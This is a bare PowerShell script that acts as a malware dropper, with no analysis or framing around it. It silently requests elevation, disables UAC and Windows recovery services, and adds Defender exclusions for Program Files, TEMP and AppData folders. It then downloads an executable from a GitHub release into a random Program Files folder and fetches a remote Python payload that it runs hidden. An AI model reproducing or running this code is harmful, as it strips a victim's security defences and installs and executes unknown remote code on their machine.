# Check for admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Attempt silent elevation if not admin
if (-not $isAdmin) {
    try {
        Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -ErrorAction Stop
        exit
    }
    catch { }
}

try {
    # Disable UAC and recovery services if admin
    if ($isAdmin) {
        # Disable UAC
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue | Out-Null
        
        # Disable Windows Recovery Environment and services
        & reagentc /disable | Out-Null
        Stop-Service -Name "Wecsvc" -Force -ErrorAction SilentlyContinue | Out-Null
        Set-Service -Name "Wecsvc" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
        Stop-Service -Name "WinREAgent" -Force -ErrorAction SilentlyContinue | Out-Null
        Set-Service -Name "WinREAgent" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
    }

    # Define paths for exclusions
    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    # Get directories in C:\Program Files (excluding Windows* folders)
    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" }

    # Add Windows Defender exclusions
    $exclusionsAdded = $true
    foreach ($dir in $directories) {
        try { 
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null 
        }
        catch { 
            $exclusionsAdded = $false 
        }
    }
    try { Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null } catch { $exclusionsAdded = $false }
    try { Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null } catch { $exclusionsAdded = $false }
    try { Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null } catch { $exclusionsAdded = $false }

    # Download and save scripthelper.exe if exclusions were added
    if ($exclusionsAdded -and $directories) {
        $randomDir = $directories | Get-Random
        $destinationPath = Join-Path -Path $randomDir.FullName -ChildPath "scripthelper.exe"
        
        try { 
            Add-MpPreference -ExclusionPath $randomDir.FullName -ErrorAction Stop | Out-Null 
        } 
        catch { }

        $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
        try { 
            Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null 
        } 
        catch { }
    }

    # Attempt to run 1.pyw in memory
    $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
    try {
        $pythonCode = (Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing).Content
        Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
    }
    catch {
        try {
            Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
        }
        catch { }
    }
}
catch { }
